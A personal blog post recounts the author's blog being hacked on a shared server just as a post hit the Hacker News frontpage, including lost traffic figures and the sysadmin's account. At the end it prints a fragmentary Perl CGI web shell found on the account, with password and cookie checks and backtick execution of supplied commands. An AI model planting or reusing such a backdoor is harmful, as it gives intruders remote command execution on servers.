Yesterday I wrote a blog [boldly proclaiming one shouldn't be a quiet professional](http://swizec.com/blog/dont-be-a-quiet-professional/swizec/1707 "Don’t be a quiet professional"). I felt it wasn't very inspired and lacked a certain amount of substance, but the internet apparently had a different idea of its value. All it took to get it on the frontpage of [HackerNews](http://news.ycombinator.com/ "Hacker News") was posting the link on twitter ... usually I have to beg, plead and promise sexual favours to people on IRC so they'd read my links and give them an upvote or two. Happy day! And it was going pretty well too until a few moments later I get a "call" from someone living on the same server as this blog ... "Your blog got hacked dude, you were killing the server, you're killed" The what now? By this time the link was thriving on frontpage and was gaining upvotes like a madman, even after it started throwing a 403 to everyone trying to read it was still gaining upvotes and from the best of my observations it was among the top five for at least an hour. Eventually it fell off the frontpage completely, but some people were still sharing the link around on twitter because they had apparently opened it hours ago before sharing.

## Consequences

The consequences of being hacked are pretty simple: a lot of frustration on my part. The more \\important consequences have to do with the fact I use this blog to drive traffic to hipstervision.org via that big link on the left and I use hipstervision to get job offers because it's currently the shiniest product I have to show. It actually works. On top of that, I'm a total numbers geek. If I see a number, I want to make it better. Google analytics are that sort of number, I just love seeing those graphs go up. So here's the deal, [Google Analytics](http://www.google.com/analytics "Google Analytics") says 1584 people came to read my blog yesterday. Pretty good right? Well, running a simple grep on yesterday's logs says that **6268**were shown an ugly 403 error. Six. Fucking. Thousand! That's more than I get in an average month (hey this is just a lame blog, I'm not used to traffic). And certainly not all of those were actual people but different spiders and automated things, but still, even if just half of those requests came from real people that's a pretty sucky thing to have happen. I wonder how many would come if they could actually read the post ... some of them might like it enough to share it, some more might upvote it ... oh the possibilities are endless here.

## Wtf happened

To be honest, I don't know exactly what happened. The sysadmin says my blog was causing a load of 70+, which I think is sysadmin talk for "trying to use 70-times more resources than are available" and was killing the server. He took a quick look, saw weird scripts on my account, and promptly killed everything. He said thousands of requests per second were being made with my account, which is just odd. HN is popular, but not _that_ popular. I can't say I know when or why those scripts made it onto the server, creation times reported were somewhere around january ... why they would get activated at this particular time, is a mystery ... Not entirely certain there's a lesson in all of this, being hacked just plain sucks and there's never a good time for going through such an affair. Just to feed curiosity, and for future reference of sorts, here are the scripts I found laying about my home dir. This was in the cgi-bin directory, now this directory doesn't exist anymore

```

my $salt = substr($pwd, 0, 2);
my $ipwd = param("pwd");
my $epwd = crypt($ipwd, $salt);
my $npwd = crypt("", $salt);
my $cid2 = cookie("cid");

  return $theURL;
}

if ($pwd eq $epwd) {
  $cid  = cookie(-name=>"cid", -value=>"1");
  $cid2 = "1";
}

if ($epwd ne $npwd) {
  $msg = "

}

if (!($cid)) {
  $cid = cookie( -name=>"cid", -value=>"0" );
}

$cid  = cookie(-name=>"cid", -value=>$cid2);

print header( -COOKIE=>$cid ), start_html($vers);

if ($cid2 ne "1") {
  print $msg;
  print start_form();

  print textfield( -name=>"pwd", -size=>"100");

  exit(0);

  if  (($takbo ne "") && ($lihim ne "")) {
    $order = $takbo ." " . $lihim . " " . URLEncode($command);
  } else {
    $order = $command;
  }

  $result  = `$order`;

  my $outtxt = "$result\n";

  print "\n\n

  print '';
  print "\n";
